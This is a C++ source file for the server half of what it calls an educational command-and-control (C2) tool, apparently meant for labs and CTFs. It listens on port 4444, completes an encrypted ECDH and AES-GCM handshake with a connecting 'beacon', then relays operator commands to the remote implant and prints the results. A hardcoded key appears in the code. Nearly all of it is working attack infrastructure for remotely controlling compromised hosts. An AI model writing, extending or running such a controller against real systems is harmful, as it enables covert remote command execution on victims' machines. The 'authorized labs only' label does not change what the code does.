// Simple educational C2 model - SERVER (controller) over encrypted TCP
// Usage: server <port>  (default 4444)
// For authorized labs / CTF only.
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include "crypto.h"
#include "http.h"
#pragma comment(lib, "ws2_32.lib")

static const char* KEY = "s3cr3t-lab-key-2026";

int main(int argc, char* argv[]) {
    int port = (argc > 1) ? atoi(argv[1]) : 4444;

    if (!crypto_init(KEY)) {
        std::cerr << "[C2] crypto init failed\n";
        return 1;
    }

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(listen_sock, (SOCKADDR*)&addr, sizeof(addr));
    listen(listen_sock, 1);

    std::cout << "[C2] secure listening on port " << port << " ...\n";

    SOCKET client = accept(listen_sock, nullptr, nullptr);
    if (client == INVALID_SOCKET) {
        std::cerr << "[C2] accept failed: " << WSAGetLastError() << "\n";
        return 1;
    }

    SecureChannel tls;
    if (!tls.server_handshake(client)) {
        std::cerr << "[C2] secure handshake failed\n";
        return 1;
    }
    std::cout << "[C2] beacon connected (ECDH-P256 + AES-GCM)\n";

    std::string line;
    while (true) {
        std::cout << "cmd> ";
        std::getline(std::cin, line);
        if (line == "exit" || line == "quit") break;
        if (line.empty()) continue;

        std::string enc;
        if (!crypto_encrypt(line, enc)) {
            std::cout << "[C2] encrypt failed\n";
            continue;
        }
        if (!http_send_request(tls, enc, hostname)) {
            std::cout << "[C2] beacon lost\n";
            break;
        }

        std::string body;
        if (!http_read_body(tls, body)) {
            std::cout << "[C2] beacon lost\n";
            break;
        }

        std::string out;
        if (!crypto_decrypt(body, out)) {
            std::cout << "[C2] decrypt failed\n";
            continue;
        }
        std::cout << out << "\n";
    }

    tls.close();
    closesocket(listen_sock);
    WSACleanup();
    return 0;
}
